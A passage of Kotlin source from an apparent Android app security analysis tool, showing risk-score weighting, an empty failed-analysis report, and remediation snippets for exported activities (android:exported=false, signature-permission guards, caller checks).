                Severity.CRITICAL -> 25
                Severity.HIGH -> 15
                Severity.MEDIUM -> 8
                Severity.LOW -> 3
                Severity.INFO -> 1
            } * when (f.verificationStatus) {
                VerificationStatus.CONFIRMED -> 2
                VerificationStatus.LIKELY -> 1
                VerificationStatus.UNVERIFIED -> 1
                VerificationStatus.FALSE_POSITIVE -> 0
            }
        }
        return min(100, baseScore)
    }

    private fun emptyReport(pkg: String, reason: String, startMs: Long) = ResearchReport(
        packageName = pkg,
        label = pkg,
        analysisTimestampMs = System.currentTimeMillis(),
        phasesCompleted = listOf("FAILED: $reason"),
        findings = emptyList(),
        riskScore = 0,
        attackSurfaceSummary = reason,
        topPriorities = emptyList(),
        patchBundle = "",
        duration = System.currentTimeMillis() - startMs
    )

    private fun generateActivityRemediationSuggestion(
        pkg: String,
        activityName: String,
        idx: Int
    ) = RemediationSuggestion(
        summary = "Add android:exported=false if the activity is not needed by external apps, " +
                "or protect it with android:permission.",
        codeSnippet = """
            // Option A: Make internal-only (recommended if not needed externally):
            // <activity android:name="$activityName" android:exported="false" />
            
            // Option B: Add permission guard:
            // First declare the permission:
            // <permission android:name="$pkg.permission.OPEN_SCREEN_${idx}"
            //             android:protectionLevel="signature" />
            // Then use it:
            // <activity android:name="$activityName"
            //           android:exported="true"
            //           android:permission="$pkg.permission.OPEN_SCREEN_${idx}" />
            
            // Option C: Validate caller inside the activity:
            override fun onCreate(savedInstanceState: Bundle?) {
                super.onCreate(savedInstanceState)
                // Check that caller is your own app (or a trusted package):
                val callerPackage = callingActivity?.packageName ?: run { finish(); return }
                if (callerPackage != packageName) { finish(); return }
            }
        """.trimIndent(),
        manifestChange = """<activity android:name="$activityName" android:exported="false" />""",
        proguardRule = null,
        references = listOf("https://developer.android.com/guide/topics/manifest/activity-element#exported")
    )

    // Severity comparison helper
    private operator fun Severity.compareTo(other: Severity): Int =
        this.score.compareTo(other.score)
}

operator fun Severity.compareTo(other: Severity): Int = this.score.compareTo(other.score)
